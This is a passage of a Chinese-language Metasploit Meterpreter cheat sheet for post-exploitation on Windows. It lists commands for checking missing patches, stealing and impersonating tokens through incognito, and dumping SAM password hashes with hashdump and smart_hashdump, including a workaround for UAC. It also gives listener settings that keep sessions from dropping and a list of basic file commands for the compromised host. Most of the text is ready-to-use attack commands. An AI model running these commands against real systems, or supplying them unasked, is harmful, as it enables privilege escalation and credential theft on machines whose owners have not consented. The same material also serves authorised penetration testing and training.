### 权限提升

查看补丁

```

systeminfo
```

```

```

通过未打补丁的漏洞进行提权 利用窃取令牌来提升权限 列出令牌

```


use incognito
```

```

impersonate_token xxx\\xxx
```

Hash攻击(破解Hash即可获得登录密码– 必须要有系统级账号) 导出 sam中的Hash

```

hashdump
```

如果当前权限为`system`但`hashdump`无法导出,原因是因为可能开启了uac,导出失败 使用

```

run post/windows/gather/smart_hashdump
```

#### 防止假session

在实战中，经常会遇到假session或者刚连接就断开的情况，这里补充一些监听参数，防止假死与假session。

```
set ExitOnSession false
  
```

可以在接收到seesion后继续监听端口，保持侦听。

#### 防止session意外退出

```
set
 SessionCommunicationTimeout 0 
```

一般情况下，如果一个会话将在5分钟（`300`秒）没有任何活动，那么它会被杀死,为防止此情况可将此项修改为`0`

#### 文件的基本操作

`ls`：列出当前路径下的所有文件和文件夹。

`pwd 或 getwd`：查看当前路径。

`search`：搜索文件，使用search -h查看帮助。

`cat`：查看文件内容，比如cat test.txt。

`edit`：编辑或者创建文件。和Linux系统的vm命令类似，同样适用于目标系统是windows的情况。

`rm`：删除文件。

`cd`：切换路径。

`mkdir`：创建文件夹。

`rmdir`：删除文件夹。

`getlwd` 或 `lpwd`：查看自己系统的当前路径。

`lcd`：切换自己当前系统的目录。

`lls`：显示自己当前系统的所有文件和文件夹。
